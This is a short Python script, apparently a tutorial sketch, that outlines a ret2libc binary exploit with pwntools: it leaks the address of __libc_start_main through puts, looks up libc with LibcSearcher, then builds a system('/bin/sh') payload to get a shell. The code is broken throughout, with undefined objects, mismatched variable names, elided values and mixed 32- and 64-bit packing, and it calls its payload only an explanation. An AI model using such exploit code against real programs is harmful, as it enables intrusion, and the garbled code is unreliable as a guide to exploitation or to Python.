from pwn import *
from LibcSearcher import LibcSearcher

puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

print "I decide to leak libc_start_main first because it has run before we get into main function"
print "It must be real address in its GOT"

print "First, leak address of libc_start_main and retrurn main again"
payload  = 'padding' + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
r.sendline(payload)

print "Second, get others address"
libc_start_main_adr = u32(r.recv())[:]
libc = LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase = addr - off
system_addr ........
binsh_addr ........  

print "get shell"
payload = 'padding' + p64(system_adr) + 0xdeadbeef + binsh_addr

print "For this payload, it's just for explain"
print "you shold make up your own payload after understand the concept!"
